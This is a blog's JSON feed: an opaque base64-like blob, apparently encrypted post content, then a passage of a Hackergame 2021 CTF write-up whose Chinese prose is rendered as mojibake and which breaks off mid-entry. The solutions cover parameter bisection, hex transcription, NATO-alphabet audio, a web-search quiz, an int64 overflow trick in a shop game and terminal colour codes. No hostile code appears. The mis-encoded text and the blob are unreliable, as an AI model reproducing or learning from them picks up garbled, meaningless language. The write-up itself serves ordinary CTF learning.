2g&#x2F;0F1bxwJ3sqYCEo4cDtsWXeAY9pidVji6BHZ25oSuiYb2G7TBpfoo26Ey8e4l5zM0KRgeBmk6g3iXILfY6DH71fjzptJ+H4I5anThAZMycGTkr7UzknBxCluU98JK4WQnU3klY4E4ZZbHrYGmO3UwRxEzyqfFVB4JFSDbuWy4OJzmDCX+LFMAD5PfOKIDAIQ1Skm6j&#x2F;UqPXoVIZelOk0A57WCZ+&#x2F;eP0O5fpc1JhtkPkvfr7yQjFIHtRbJb2toReQxHtLvrFhAyBvC28xxI63fX&#x2F;C1At2u3agpy4KnUzAwdVAUVq9f2DjxTkrh3btk83i8aLG2QQvg6DCr7KB9Tw4exkc6MMxtjtpbwgZx0dLsh&#x2F;SyYBTRs+LgsfsBLVg5FhviLay+47uuXl6CQBZHQXcBl8LmRxOrYsHQnkgQ1qBpl7uJO5ru1rTMdbDP4+TSoxNcUEFZcHal0Baz4Srikc447dhDkvPtnEdIdxJEN5xnbHqd0EsE1f3Dn2vQLcQ7BeYWWUGLCdLte95y6EdYvL1r96Ggqv6izkQ&#x2F;aImw5Hif5KPuGt1Og8GPPlywv8wIDpi&#x2F;7V2Xw1FCOuJXSQRJjoKow87AcpKmmjKEHew0QdI6cOEBDwZki5bjFA9j6LW3NckoFOu7QTaA5alDsTWKJMnwHEN6Mn3IfoPVs7bqM9q6sPmDyoVUd8AjgA2iYkaJlS8TcXqWLl7z&#x2F;4F5GjmmV7a9hcY&#x2F;ClYN7zhagdUaFakLKkw0ngzsjZP45&#x2F;Hn0HWUfDH7NaLLovWi&#x2F;wKXYqrrMZkvKqVDhSD4U57zKCS05tBg0jqoW2digZPvzHJHDq2UV5o&#x2F;9MaIyTPgzU7JhUTrKOD+HzX3ZYvsFrmUfx9eiCVK57OkxfDGrzmVCgjX9ZIn2r0UzEbI1mfjHq75DiES38S2g67ypcnjnX4&#x2F;o2qmHI9GR7xzsB70Ol96WGcoOvYn2v6&#x2F;ldWx8dGOBRiTXUWve4jgtdCWupi4O8AikIhktX8sTJ+VBEhNr9negjA+FQj3y1xaPYl4LTyzpgiaeIDBUZnyt8Lgl&#x2F;fi&#x2F;Nm12nQDhE2vEJ3R2cjciLWG50b6U+9r94bS0nzbY0uupbI+fep8DE7ty4NHo0TtFF&#x2F;58f49MEj7c56AWzLGanI+OnYqYJ7w5tCbhY4V01jYYwEX6Ur0GWOZvsmOeR1kCSMLVWRcNipjOBr8LA9JeTfVr0WPyvl4rBD0RJ2ITrP3jn85iHVYMUCmTiXaav6poh1+WCPYM2J9q4bdwK1TBxX2vBCv33t&#x2F;e6wABwqh5wsy1APhgzL1ZTZrSsnCNfnPXbJXtWCaexkYF58gRZ3+I2XZgYvmj37TT53qhayl7sNImuGLFWuWVH0um+ldqP1u0joF+&#x2F;BiJTD1gbgtSE+HW3r+Ntd5OgQBbXHhy54d4ABucD7RqFS95GlwadZV6v4AjJFKFYh1rnDZHKVDT9Ux301iTmwFvPatYPwCyJAmJ4bndBzhmwDl&#x2F;yU8KFuZ8zbA8yUr5nrtSu9A&#x2F;I6rsRtMdKQTJMRZ4iL5s1zmZTzPVF1&#x2F;VOoqIVLP8kDtuyyxVXGUcufl6nIHCYoQlbvvXQV3TWIlnut2uWxuedeTuOS3vQj1JDnmkEnc&#x2F;BmjeY2zGFgxtDpTjwW&#x2F;Eh9SFJq9ZctkGkPdwrXCXr+DThhguEGXS7fGJeScW5fN0&#x2F;u1w&#x2F;V4c4VW9&#x2F;GNDBZRuG6AyUjEjVABlBj4fER+2vhhzgnzhTnh+j5qNpMFy7Jhd0gmLgdywSUTrK2U96l9tcZYnIMOnLlAzinaqDauE9KigK+x4tWxEW9LMmfCsmV72BRaIpx8xrrmvaF0DYLKCqxvY3SdCU3YIxA6iIMhShTN15M6znJzq8kufcm6FJ+iO6bzDnDLSwdUteGfQCgHKAK4S&#x2F;NPsChjP5OB&#x2F;qWZsq1KCFTUh1+04E+F2oHfwMUitqLV1blL4KPUeImUx0ldbeXHtEMxHwWX9CQbU2Ksd9iyCB9oye4ANR5FDpYJBC5Yvb9SAMW18zT99I2FfS6S5umUDm&#x2F;uTR0V3fAjWMDwwjhuWH9YZRqOADr9UXNHdJn5M4MagfplbfBdWWiU0Waxc+14EZkX0&#x2F;62UKO5YyZzkHrv2X0jckDbGFuG29fY6PJOnmY+UN6JhOJ52OfrjR4KIrp2SORgHzEUqD6YzF8zhmBsMZ8AY9&#x2F;GMAGLbV1zhbuIls5FzIX1JdeJNzEUt31nIz5rEfhgXQa5eHFUqxrE7xZTzajOG0e&#x2F;CF&#x2F;xJeTt85iii40wTADQ875fgxnR6hBbqVGb6PVKekN&#x2F;1CNbCyqyp&#x2F;NbS8rS5Q+49NVtF8anddxlb6PkliqxlKlrBUmQKDT1d5tgkEeyNj8cBS4Ve3bJG4Pd526iqqmyW8y&#x2F;EiGLa6RwVe9VmUB2qp&#x2F;4GlWqZ&#x2F;tb4Z5T4KkXvpEv6MtV5+DHyjqlDNSmYcFL9N8Zk31TyVckkMWxcrvYZ+gZnCGqiQQPmCXhYfGlaMDkBhAZNSBZwX0c1fyKNCu7wA2D29l&#x2F;NquX2VfowrYAExOVlh6Gpa0O0BlyqCJYwI0lnaPpqhnhaDO6mTiokYuWOiQnSrVRBGHk2cxLKt0VH&#x2F;hL92mWc13+AmEemKcOJJaj9RRAWZ0t3H7WjgMhJgR26xJufcfES74EM1FEta1s8vboiDfcTOwXCdUInCnV0Pq2atGpq4oCxuM8YdlR+iopxMehFm&#x2F;FdR5tedsLN87jJIEC&#x2F;CJcWYLF3wE4lt9NOJk10ZHRxSgLS6&#x2F;42fGTFx+chZaN7JxAFhKPttpz3PG038aclzC7G&#x2F;fR0wUXnoi0U2Aide+DZfRWLn05rPDMRuodYTLet&#x2F;4GdbIgdGOqa0LReMei3+g8Ej+h2s0qRxb5fyixwjwCO1HDny5tK4Y3iG&#x2F;KbGXo0vsMymGcAQNphEn94EHk6oaBlHRbgtcwWOEqMlSLLyI5z3OqmoxK6WLj0Kw9g3YiSFSYhCNwa9gw9032cRSLxWDhGGBSF5T9wmjn2J7y4jgg1qrlQa1oTJ+Ep1jBsTQKJIds+E&#x2F;+XK3&#x2F;dCQLIBWkcQFGXblOkukLR&#x2F;uhCdMhhLcbsz1GqYI&#x2F;29K7A6uj+zm8Ep&#x2F;uLgpBQFrxFuIUYFQ4&#x2F;1OO&#x2F;ZkuscEGirPyeDkVeRHVjCt6JFCWUFC0X6ZNtbmSyD51BFNmv+gJroUxhddlWDADjDWI63N7tTWIPJ5mkv9VRM5WGZFrxSIiIZ9M4PXNTErzxRB3008xdtbUrKqlBuoPWsRK4Cea4IdiOyyISAtallenfMlWGvNV1FNzKY1CliJRLtEErg+5UurywxwuMDerKcMx5c&#x2F;+3MoCtFTCLOp3JI8uL6M2qWbSuRFd1Q6PEEH&#x2F;QUTHtmxopXhztQ5zoclhcKKugfxhz1iQLVRohWD&#x2F;xnbjahebmp9pV836wIjebrltKo31KpluhberLabcbIBtGAqtT6BtadXtcwPX5ensTQNN7U6xPE4IAREcClVchuzQGalwss2s1si9D64RHkqX97txTJQ3Yk7xuGa+OmPCNPCGGadbEKbrhIPpCI&#x2F;3ryILqToozUfDjXQrzl3rvNyxAy9pwtcWj1iBGFN&#x2F;8JBkCBi0B+IspyFYk65RkOfiXE6X1I6IjjYyAUszYInPfOeY8RKrSnuxBj401BlRljYkTALlITzxAzVBytpxQwP4Ofhj1Gty8JVBdsveNvA2M6fw524lGFOadqThTqdP330aqL1HrJhhw&#x2F;cZo+wAYmvo9dgrbDLlK8yDyLtBhRmCQAnwf&#x2F;CtdVK3bqAlw2xr2S0tBNIq5dC&#x2F;9QU+yiJSJlf57Ui186BnzLNLmfkpWxU5oW3RnWXaM21bqNvrarqnqEKxcQiTTP6Le1BDhuoceKzzB7rPlMjPO6GUXO3pFaZfMgwwPmNBvFEnCEsLngzjObiJARrEmtV&#x2F;I5RRTUXMAwCK5ookoSFfFVfqTih36sJOaBCCDR+TEkQ3zQE2ZvV35OTb586cPbvp0B3Vd+RRnF79Z4+56etRg38pDY9EEFj&#x2F;&#x2F;trgxQ&#x2F;QkYclWHqeUWm5pKhFZ+g2qLMlVs1K0q8d6sSsvt0R7iuDZtNZZLd9D&#x2F;lxyz7rkGT7DpqTpOjvRZqG+VGquYaLFId+xE6nqPM8CEWz1&#x2F;NT8691a6XX7qCdWSm78nmrZ&#x2F;IX4IGGc5LZBLo8j9sf9lXqGNqSYKOjdkEIKswoYTfxRk4y4&#x2F;cWo9f5nIbP+Vaw2bjZ5WKespE4CTAOxpk7DHXxh5wzYPld6NqjdYiaz1+DbLWVSIeRfX0h+bbsFal6+gDJ8hM5bHc5xrlim+nCloZXuBhEsd9ZEEIiGdew&#x2F;l72jCnlfZH&#x2F;tfxshLOAvJY86uGsytRp3UkGtDmnloRtJJ4lYB3aoIgcuQSt9NzyqU&#x2F;sK8ivilobtO3s9+iDykFnLmtpI&#x2F;c&#x2F;wZMQ6na0GuyohYe397yya9UosBdt5jhumBxntnIPVeqKCdavin&#x2F;P5AGbWo8LowD2pGyD0pHR9ptBYDuuIv4&#x2F;tBuskdK3HQHPCOGIFj8Syqc9LG29IwtySpz&#x2F;AkBEIg+81UJ5V+b5r7&#x2F;jjlepp8ow049YyDcKzNP8HGAhfmYtEPb0zZKcd7ZyGYhID9RfUwHrPRSdSFuGDZhiBYhdrI2lpXaUgsbpho+CjUp74Dl6pl2RX+YNZSbl3P4wVfNBMlmOHWqJ8UEctbb&#x2F;DVoSjs3C0kptMRBbBSwK8uUi9AR+Y17Ruti5Li7Hcc4iQ7FDJ7wnkAXD3KSGZ&#x2F;OEvM1ghAazhRMeKANiZ&#x2F;CGSidJwBq+PdF3RbqsshaWWjVi6oq9JktiCI78yJuZ+funSupw&#x2F;M0YXKyiuXD6ZrxMcG5PjTWb&#x2F;FH5XR2QtUTSwq&#x2F;z1yYnhXTjtMjP6kex7yda58C&#x2F;QD+0YBdKhyMxuwSzOixS5ryofQ5cavR&#x2F;4zOBtxmDewhTSII+eLpgqFMdzZFnG7Bk4ot1AHPCOxA1bdEn3IzH9GQ7NMo3G4kskakXZC3K5QHcsgUr+&#x2F;8k8fY79Utp&#x2F;3sq&#x2F;MqTgeml7NAau0jhkGbMANcr4jZj3N4tBsmo&#x2F;InMiI7+H7k1fDa32BrzdoevMfJYA3PaDHFRFuoeDlWAnxAAyk11kKjnidwQ&#x2F;rBqIzrdIBMAfyfbrA55Q47SBe7fwVrzFRBPKtjICzBPKzlIU5&#x2F;xIfDo3IpEY8h6emLxN3dLLLuIBoCtm7MqkB9MA7hzlEwkGPY0oUwtH323Y43Y69s1ldtzi+J+tVbCJrz2y1VVo1sLtoRgxkTqjqCtJpOi2Q7JLLX1433EQ8tywYvxCjuBH4N8GVPsUCuZFVpUZ7kQEfpCCmRnyyIE8myFbHHKBqq369PP49Pv6OzpkbHJ2ZictG9Yoi85ahlyqbnSacOAIfRBnruBBqo4KwTbAgbesupr0cCPEEMfb0pdyhFFC91RfG0H0ASsdfZk66Jfd2TCjagq8&#x2F;CKoCP2Vi+GLsV3du38v9uELTX3j3gxskoyDeb020ElGDk3L0rl2fIh8fa68knJSWs2z17N09NtGlNLzdbCu9AXBtq+bdxEOZXWk8u1o+YlFRFjphBNf9eMM3itN1&#x2F;5wv2A3e++qsB3t3ZCyaz7ltIdzmy5us9lgNIo4h4ZYpHyUeuQbAqqb40v2w+0g1e&#x2F;+9jtQJfZM+T+LEs16v8UQMB2Pr5Ug4lULpuYga76cbN&#x2F;zebqqe5ABGYWEIBFM+bxLvNv6c3v0VREhA1QvSEqLeYR6OV15tOIzjpJf4dGP6URUYyIz1UlJkEQZSjUFCq2H76YOtieydin+5wXwB&#x2F;s+jicn09aE6B3OYtp2CDBsDOdTtoOOzfz85Ee1dLhL9ogTrbaxkF0w8HRyACovRiag31U05liMpzg1CMVrDQo5qRUAdcNyJEXkSPbY88iZ75h&#x2F;+9N8JhSeJQzxrhl5nhlR9jct9H0RP8fGdt1EGlHCMsxGRVmRBAxykf2bt5N6qnN6&#x2F;Sjdfi0oPDxWdi3Y9M9ZWxgbqt5Tg&#x2F;UW6v9EGe0+hA8Ii&#x2F;Bq5Idw&#x2F;gFR5jlnTwKdB58apXtbtaYnyU3T7dAWwtZ4OvIfv7&#x2F;gpPbeyS1TqY71Gib1CW&#x2F;lWfIO&#x2F;0H98bOHPDIl8Ut3fi5xQG0yqHgQS165tTf2xo1i1sqD6tNDhCIDu&#x2F;1uefrNO3ExZh3Ea9Ac3428&#x2F;GWPVHlg4sqLKlZPds5NfKh0df+VPT3OLPLCH55NQXFtqwE&#x2F;ZsCguOl42vTcKWrkXl71Gp+X5x+mdAu+H1KNhU3f6p&#x2F;5sXiLyWT+T7h4SGvyOeBLUwJer4tFpByMATG560KhAuixXyzXwv8j70CyJp8s399T+N8eQhAxhXVBxgWdtl6Eu+rBPWbHmZXEH1&#x2F;mghBG+RFwuCh4jNPDeQDOBewYrmimmbpmFt1Iqz&#x2F;fuI5eSH8zQLMuzPKYhEG4p+5kPdBQkQz4NWzlrQ0yE2pXBvPNPngsljuC3pAVjRrUVb7MZtuO3BXPeDSb+EXgylh5rBmG7bkk43bdQ4TQyNs&#x2F;FYt7cQ7tFzBQUhWoIDNWKiEs0hThjLY4Aw9zFxuF3Uf9H+fU7GlwZBrsU+QdPR0vKxB5EeyHUamO&#x2F;NYRd5RtFNym4HhMqSEoTQPqLv79hzNyMyMvbrkOly&#x2F;nIwAyXmBmaVTVwVZr1fT+zXgzQL+VY5ByLjJrDw4ghbk67RGlX0qTyXV4mXY41j+0YZioIDBDJHP7D8QHrhQpzOzhMyxkQ7WvTLWEaZqbvGSXN619WL1j9XZOecnOAZazEm0BawPD9vVCMar6VD01ZKHIQVY6+EmdhaWr9j4afovGGPIeFaLzg1YwA6czDMdWH0pbZmV539qrs+sX+toGO5fXI7buTnjvcbi85wKSPj1xlvSIVYD05WH9EX2S8IsJrdLqxVlG4IQj4TIzUpbKxuChuNjDQO0idakciMB9Mkg7ZEolOltVBvZWv47UhoMZHfECUqQARpkRfl8B3YW37L1ihQC1HVpGSI9EiqCLd6ZD0cjg6+E1JK3yDZ3pr0or57JCMX2U0Lf3G3zDiZ9E+kit5C4HsNPCA4Xq9qLcEnSTbUrwR&#x2F;+Ol6DndvqxVSUjYEJCrmqp&#x2F;Fi1CY2XgCle5ojZ9IAWjrbg01FGZMCi3iiSfILVNcl8q4ZZFLweZbi+TivrAC+zRX8cpdCBSMrdC5pCMsIPvzRLJNm+jY32VdintOlE4xMHTk9rr2uNKJ4hQKJREyoz7XCYJrlo9LYIcS2o9lKo3xjSkpnC0SFtg0Sy&#x2F;pcpZw8wyOO2hTXOTmKzyOlw7VH1LtxTB14XoT95Y7euHiB&#x2F;11oz+6uOb3uRm4iql1s+tXka5CfeFhSt9xk3k4S91VDa7f3akOPDdxCQ701qVjM5&#x2F;aat2ARuoYfoghi1AwKpuWYchdLoYSrOiXX91SeH4gOR5UP8KXg2TnNOTvpHN5LRBKm58rMDe7ZmZCNM4AnubKNBP&#x2F;X8UNMaIokp3+I6KpH0c3jmTnSHnLwoi5oqfNx&#x2F;qT2K7ePGq3nqfTkCDqWKSWTe+QG6BsOXetF9mSKh8lPJbru3DfzZ6ICHsZIpfy8Vcfks5Hk+LT44&#x2F;jwWR9xz0B&#x2F;ia2bB6mG7X5Wo5AfbIFSVtrwYmm&#x2F;bx5Mib9QOK1U2X9zav7ObfFmMpENUCxEi1tr+bVQt&#x2F;iubPbpFZ6DNce8msWvzHhhV+81gn&#x2F;QQ3YW+yq&#x2F;Sm5CTP9pMfI72Mt6XCYtr1a6b&#x2F;vWaKnBKOL7dS7w5ORYbH9GlxhtEv4s5wdh+uqDjIZJp4jTt8ysEikkyJg8vj60Ymgd4Q6GEytoArUF7MfNB&#x2F;hYcgcCEOiOcVTRWL&#x2F;sLMDeaSklA1i9tVBUP95ROYnHIR4qoKdqBsEAbGBfjnNMiSwqp&#x2F;pdZIvF0LtjzRxgD5&#x2F;BOvxZtq9zpu8WTP+InLqLtMkXXffeNwM7fKFvfb3RNQfXMPa8wNMLD80D3NyeVEJBZ3AZzhEKaruVZMfhbS&#x2F;Nmcec9GF2nWQm2L8+qLxWbi0OM1lXBuCvMZ5DU8u5tr12a&#x2F;vTwM0CP4gZ0ga9TSNVb2vfJdtHDuC9BSlTB7KcA&#x2F;&#x2F;xvozzLKhfZEUQvmOoyxtzthFSf&#x2F;b3KhAUgu5GzrMSPPiEGNFIWbqm0UF9j5GStLEXm9fOuFvefZw5mH5q0zoIr4cbLFjRjE67EkG0riIEpGjoSG5c3GTsALEhfkv2VpxhSbtucDmKnftpHxYZQcJ+Atg9MnlcZ2mLE2wi8TqJ&#x2F;Y8ODehHR6ocioUPGxZJblrquxAjAARnsqNZ1eIJIO2vOH83HUg0zGhfq4ag4DEEwIxczSRqNnMSuSta+O80zpla9CVaDwcLUG7KMyu0pTrwSLtuGgSa14iE+SQza7jIJs8PTwwRMb7N89oOaXs3QWsmlSybak0pgJ+pZLCiPQYHgD91kaTCRDOOz2sX1F4FSe4OP8ehuEH5vVhcg2&#x2F;FRn0w5AfPRhz30XstZkZrJzYWLNLcB1uPC1bR5YD44AgaRPWQQmLdkmRj8ea5siGd3aDEPDAfNUUatAzwBsfZKZUis2P5LbAJpTjbxbQ9&#x2F;Y8b9aqafukEV3Vs23IEyTx4uRWGUqbpP&#x2F;e9vr6gFGcjM80TkKrsoiG6CuySRQUnUPGAmco8TZwI1ETwthdL5Xh2D82vI1Q93Lh1n194uCSLKPbVIFgxONJIKyIJFfAU&#x2F;kP9Beqb+oLoBulIbDeechaTNfe8RrzZM&#x3D;</p>\n",
            "tags": [
                "Write-Up",
                "SchoolBus"
            ]
        },
        {
            "id": "http://cubicy.icu/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/",
            "url": "http://cubicy.icu/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/",
            "title": "Hackergame2021 éƒ¨åˆ†WriteUp",
            "date_published": "2021-10-30T08:11:00.000Z",
            "content_html": "<h1 id=\"WriteUp-by-YYY\"><a href=\"#WriteUp-by-YYY\" class=\"headerlink\" title=\"WriteUp by YYY\"></a>WriteUp by YYY</h1><hr>\n<h2 id=\"ä¸€ç‚¹ç¢ç¢å¿µ\"><a href=\"#ä¸€ç‚¹ç¢ç¢å¿µ\" class=\"headerlink\" title=\"ä¸€ç‚¹ç¢ç¢å¿µ\"></a>ä¸€ç‚¹ç¢ç¢å¿µ</h2><p>è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€æ¬¡Hackergame&#x2F;CTFæ¯”èµ›ï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€ã€‚å‰å‡ å¤©å¿ƒæ€æœ‰ç‚¹å´©ï¼Œå¥½åœ¨è°ƒæ•´è¿‡æ¥äº†ã€‚å¤§å®¶è¿˜æ˜¯è¦æŠŠHackergameå½“åšgameã€‚æœ€å¼€å¿ƒçš„æ˜¯è®¤è¯†äº†å¥½å¤šå¤§ä½¬ï¼ŒæŠ±å¤§è…¿.jpg  </p>\n<p><img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030161203937-1693462675.png\" alt=\"emoji\" loading=\"lazy\"></p>\n<p>å¯¹è‡ªå·±çš„åæ§½ï¼šEasyRSAå·®ç‚¹åšå‡ºæ¥ï¼Œæ‰©å±•æ¬§å‡ é‡Œå¾—å†™é”™å¼ƒç–—äº†ï¼›RAID0å¡åœ¨è½¯ä»¶æ²¡æœ‰æ¿€æ´»ç ä¸è®©ä¿å­˜ï¼›å’Œå„ç§å°æµ‹æ’ï¼›å„ç§ä½“è°ƒä¸è‰¯ï¼Œé¥®é£Ÿç¡çœ ä¸ä½³ï¼›æ™šä¸Šå­¦æ ¡æ–­ç”µæ²¡æ³•åšï¼Œæˆ‘åˆæ˜¯å¤§å¤œçŒ«å­â€¦â€¦å¥‡å¥‡æ€ªæ€ªæŒ¡è·¯çš„ä¸œè¥¿ä¸€ç›´ä¸å°‘ï¼Œå½’æ ¹ç»“åº•è¿˜æ˜¯å¤ªèœäº†å•¦ã€‚<br>æ€»ä¹‹éå¸¸æ„Ÿè°¢@TonyCraneå¤§ä½¬ã€GodSpeedå¤§ä½¬åŠç¾¤å†…å„æˆå‘˜çš„é¼“åŠ±æ”¯æŒå¸®åŠ©ï¼ˆè†œä¸ç®—ï¼‰ã€‚<br>å¸Œæœ›æˆ‘èƒ½æ—©æ—¥å­¦ä¼šbinaryå’Œmathã€‚  </p>\n<hr>\n<h2 id=\"ç­¾åˆ°\"><a href=\"#ç­¾åˆ°\" class=\"headerlink\" title=\"ç­¾åˆ°\"></a>ç­¾åˆ°</h2><p>è¿™é¢˜äºŒåˆ†ä¸€ä¸‹pageå‚æ•°å³å¯ã€‚<br><del>é¼ æ ‡è¿ç‚¹å™¨</del>  </p>\n<hr>\n<h2 id=\"è¿›åˆ¶åå…­â€”â€”å‚ä¸Š\"><a href=\"#è¿›åˆ¶åå…­â€”â€”å‚ä¸Š\" class=\"headerlink\" title=\"è¿›åˆ¶åå…­â€”â€”å‚ä¸Š\"></a>è¿›åˆ¶åå…­â€”â€”å‚ä¸Š</h2><p>ä½¿ç”¨Hex Editor Neoç›´æ¥æ–°å»ºæ–‡ä»¶æŠ„å†™å³å¯ã€‚å½“ç„¶OCRè¯†åˆ«ä¹Ÿè¡Œå§ã€‚</p>\n<hr>\n<h2 id=\"å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢\"><a href=\"#å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢\" class=\"headerlink\" title=\"å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢\"></a>å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢</h2><p>ä¸‹è½½éŸ³é¢‘åå¯ä»¥å¬å‡ºæ˜¯ä¸€æ®µäººå£°ï¼Œä½†æ˜¯è¯­é€Ÿæå¿«ã€‚äºæ˜¯ä½¿ç”¨Adobe Audition CCæ‰“å¼€ï¼Œæ•ˆæœ-&gt;ä¼¸ç¼©ä¸å˜è°ƒæ”¾æ…¢é€Ÿåº¦ï¼Œé€‚å½“è°ƒèŠ‚éŸ³é«˜å°±èƒ½å¼€å§‹å¬å†™äº†ã€‚å¯ä»¥å‘ç°è¿™æ˜¯<strong>NATO Phonetic Alphabet</strong>ï¼š</p>\n<blockquote>\n<p>A ALPHA<br>B BRAVO<br>C CHARLIE<br>D DELTA<br>E ECHO<br>F FOXTROT<br>G GOLF<br>H HOTEL<br>I INDIA<br>J JULIET<br>K KILO<br>L LIMA<br>M MIKE<br>N NOVEMBER<br>O OSCAR<br>P PAPA<br>Q QUEBEC<br>R ROMEO<br>S SIERRA<br>T TANGO<br>U UNIFORM<br>V VICTOR<br>W WHISKEY<br>X X-RAY<br>Y YANKEE<br>Z ZULU  </p>\n</blockquote>\n<hr>\n<h2 id=\"çŒ«å’ªé—®ç­”-Pro-Max\"><a href=\"#çŒ«å’ªé—®ç­”-Pro-Max\" class=\"headerlink\" title=\"çŒ«å’ªé—®ç­” Pro Max\"></a>çŒ«å’ªé—®ç­” Pro Max</h2><p>GeneralÃ— æ‚æŠ€âˆš  </p>\n<ol>\n<li><p><a href=\"http://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes\">ç»å…¸WebArchive</a> ç¬¬ä¸€è¡Œå°±æœ‰ç­”æ¡ˆ:20150504</p>\n</li>\n<li><p><a href=\"https://lug.ustc.edu.cn/wiki/intro/\">https://lug.ustc.edu.cn/wiki/intro/</a>  </p>\n<blockquote>\n<p>æ­¤å¤„èµ„æ–™æ˜¾ç¤ºæ˜¯4æ¬¡ï¼Œä½†å¹¶éæœ€æ–°ï¼Œæˆ‘åæ¥æ‰‹åŠ¨å°è¯•æ‰å¾—çŸ¥æ˜¯5</p>\n</blockquote>\n</li>\n<li><p><a href=\"https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2016.06.16_%E6%B4%BB%E5%8A%A8%E5%AE%A4%E6%90%AC%E8%BF%81/IMG_20160616_133655.jpg\">FTPæœåŠ¡å™¨</a> Obviouslyï¼Œç­”æ¡ˆæ˜¯Development Team of Library <del>åæ¥å¾—çŸ¥ç½‘ç«™é¦–é¡µnewså¤´å›¾å°±æœ‰ï¼Œæˆ‘è¿˜æ‰¾äº†å¥½ä¹…</del></p>\n</li>\n<li><p>è°·æ­Œå…³é”®è¯<code>SIGBOVIK2021</code> <code>Newcomb-Benford</code>ç›´æ¥å°±èƒ½æ‰¾åˆ°åŸè®ºæ–‡<a href=\"http://sigbovik.org/2021/proceedings.pdf\">http://sigbovik.org/2021/proceedings.pdf</a> ç›´æ¥<code>Ctrl+F</code>æ‰¾åˆ°æ–‡ç« ï¼Œå‘ç°æœ‰14ä¸ªFiguresï¼Œæ’é™¤ç¬¬ä¸€ä¸ªåœ¨Backgroundé‡Œçš„Figureåå¾—åˆ°ç­”æ¡ˆä¸º13</p>\n</li>\n<li><p>è°·æ­Œå…³é”®è¯<code>protocol</code> <code>report</code> æ‰¾åˆ°<a href=\"https://www.rfc-editor.org/rfc/rfc8962.html\">https://www.rfc-editor.org/rfc/rfc8962.html</a></p>\n</li>\n</ol>\n<blockquote>\n<p>6.Reporting Offenses<br>Send all your reports of possible violations and all tips about wrongdoing to <strong>&#x2F;dev&#x2F;null</strong>. The Protocol Police are listening and will take care of it.</p>\n</blockquote>\n<p><del>è¿˜æŒºå¹½é»˜ï¼Œä¸€å¼€å§‹è¿˜çœŸä»¥ä¸ºæœ‰policeåœ¨listening</del></p>\n<hr>\n<h2 id=\"å–ç“œ\"><a href=\"#å–ç“œ\" class=\"headerlink\" title=\"å–ç“œ\"></a>å–ç“œ</h2><p>20ä¸æ˜¯3çš„å€æ•°ï¼Œä¹çœ‹ä¼¼ä¹ä¸å¯èƒ½ç”¨6å’Œ9åŠ å’Œå¾—åˆ°ã€‚ä½†éšä¾¿è¯•äº†è¯•ï¼Œå‘ç°9æ–¤çš„ç“œå¾ˆå¤šå¾ˆå¤šæ—¶ä¼šæº¢å‡ºä¸º-9223372036854775808ï¼Œæ®æ­¤åˆ¤æ–­ä¸ºint64æº¢å‡ºï¼Œåˆ¤æ–­åº”å½“åœ¨æ­¤å¤„åŠ ä»¥åˆ©ç”¨ã€‚<br>æˆ‘ä»¬éœ€è¦è®©è¿™ä¸ªæ•°å­—ç¨å¾®æº¢å‡ºä¸€ç‚¹ï¼Œä¸èƒ½æº¢å‡ºå¤ªå¤šã€‚ä¹Ÿå°±æ˜¯ç•¥å¤§äºfloor(9223372036854775808&#x2F;9)ï¼Œä½¿å¾—æº¢å‡ºä¸º-9223372036854775808ä»¥å¤–çš„æ•°å­—ï¼Œå¹¶ä¸”è®©è¯¥æ•°å­—åˆ°20çš„è·ç¦»èƒ½è¢«3æ•´é™¤ã€‚ä¹‹åç›´æ¥åŠ å›20å°±è¡Œï¼ˆç®€å•å°å­¦(?)ç®—æ•°ï¼Œå±¡æœ‰å³å°†åšå‡ºæ¥æ—¶åŠ è¿‡å¤´è¶…è¿‡20çš„æƒ¨å‰§hhhï¼‰<br>çµæ„Ÿæ¥æºï¼š<a href=\"https://www.bbsmax.com/A/pRdByjq65n/\">CTF ä¸¤é“webæ•´æ•°æº¢å‡ºé¢˜ç›®(çŒ«å’ªé“¶è¡Œå’Œltshop)</a>  </p>\n<hr>\n<h2 id=\"é€æ˜çš„æ–‡ä»¶\"><a href=\"#é€æ˜çš„æ–‡ä»¶\" class=\"headerlink\" title=\"é€æ˜çš„æ–‡ä»¶\"></a>é€æ˜çš„æ–‡ä»¶</h2><p>æ ¹æ®é¢˜é¢å’Œæ–‡ä»¶ä¼šå‘ç°è¿™æ˜¯ç»ˆç«¯çš„é¢œè‰²ä»£ç ï¼Œç½‘ç»œæœç´¢ç»ˆç«¯é¢œè‰²ä»£ç æ ¼å¼åå°†æ‰€æœ‰<code>[</code>å‰è¡¥ä¸Šä¸€ä¸ª<code>\\e</code>ï¼Œç„¶å<code>echo -e &quot;&#123;å†…å®¹&#125;&quot;</code>å°±è¡Œå•¦ã€‚è®°å¾—æ‰§è¡Œå‰æŠŠç»ˆç«¯å…ˆç”¨å­—ç¬¦å¡«æ»¡ï¼Œä¸ç„¶å¯èƒ½ç”»ä¸å®Œæ•´ã€‚<br><img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154901529-149476643.jpg\" alt=\"chars\" loading=\"lazy\"></p>\n<hr>\n<h2 id=\"æ—…è¡Œç…§ç‰‡\"><a href=\"#æ—…è¡Œç…§ç‰‡\" class=\"headerlink\" 